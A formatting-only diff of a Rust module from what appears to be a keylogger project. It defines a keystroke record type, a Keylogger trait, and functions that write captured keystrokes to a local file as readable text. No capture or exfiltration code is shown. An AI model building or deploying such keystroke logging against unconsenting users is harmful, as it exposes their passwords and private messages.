@@ -1,13 +1,13 @@
 use std::fs::OpenOptions;
 use std::io::{BufWriter, Write};
 
-#[derive(Debug,Clone)]
+#[derive(Debug, Clone)]
 pub struct KeyRecord {
     pub key_code: u8,
-    pub time: u32,  // unix time
+    pub time: u32, // unix time
     pub key_name: String,
-    pub press: bool,  // release event if false
-    pub modifiers: String
+    pub press: bool, // release event if false
+    pub modifiers: String,
 }
 
 pub trait Keylogger {
@@ -18,16 +18,13 @@ pub trait Keylogger {
     fn stop(&mut self) -> Result<Vec<KeyRecord>, &'static str>;
 }
 
-
-
-pub fn write_keylog_to_file(filename: &str,
-                        keylog: &Vec<KeyRecord>
-    ) -> Result<(), &'static str> {
+pub fn write_keylog_to_file(filename: &str, keylog: &Vec<KeyRecord>) -> Result<(), &'static str> {
     let file = match OpenOptions::new()
-            .write(true)
-            .create(true)
-            .truncate(true)
-            .open(filename) {
+        .write(true)
+        .create(true)
+        .truncate(true)
+        .open(filename)
+    {
         Ok(f) => f,
         Err(_) => {
             return Err("Cannot create or open file");
@@ -37,7 +34,7 @@ pub fn write_keylog_to_file(filename: &str,
     let mut writer = BufWriter::new(file);
     match write!(writer, "{}", _keylog_to_string(keylog)) {
         Ok(_) => Ok(()),
-        Err(_) => Err("Cannot write to file")
+        Err(_) => Err("Cannot write to file"),
     }
 }
 
@@ -56,7 +53,7 @@ fn _keylog_to_string(keylog: &Vec<KeyRecord>) -> String {
 
         // if nothing has been printed in over 10 seconds, add new line
         if time_diff > 10000 {
-            keylog_string.push_str(&format!("\n<Inactive for {} seconds>\n", time_diff/1000))
+            keylog_string.push_str(&format!("\n<Inactive for {} seconds>\n", time_diff / 1000))
         }
 
         if current_modifiers != key.modifiers {
@@ -86,7 +83,7 @@ fn _keylog_to_string(keylog: &Vec<KeyRecord>) -> String {
                 k if k == "Alt_L" => (),
                 k if k == "Control_L" => (),
                 k if k == "Shift_L" => (),
-                _ => keylog_string.push_str(&format!("[{}]", key.key_name))
+                _ => keylog_string.push_str(&format!("[{}]", key.key_name)),
             };
 
             //keylog_string.push_str(&format!("[{}]", key.key_name));
@@ -100,4 +97,3 @@ fn _keylog_to_string(keylog: &Vec<KeyRecord>) -> String {
 
     keylog_string
 }
-
